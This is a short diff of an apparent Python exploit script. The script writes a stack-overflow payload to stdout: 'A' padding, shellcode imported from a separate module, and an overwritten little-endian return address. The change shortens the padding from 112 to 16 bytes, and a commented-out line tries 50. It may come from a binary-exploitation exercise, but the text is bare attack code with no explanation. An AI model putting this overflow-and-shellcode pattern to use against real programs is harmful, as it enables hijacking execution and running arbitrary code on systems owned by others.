@@ -4,7 +4,7 @@ import sys
 
 from shellcode import shellcode
 #sys.stdout.buffer.write(shellcode)
-sys.stdout.buffer.write(b'A'*112+shellcode+0x0000000000401e6c.to_bytes(8,"little"))
+sys.stdout.buffer.write(b'A'*16+shellcode+0x0000000000401e6c.to_bytes(8,"little"))
 
 #sys.stdout.buffer.write(b'A'*50+shellcode+0x0000000000401e6c.to_bytes(8,"little"))
 
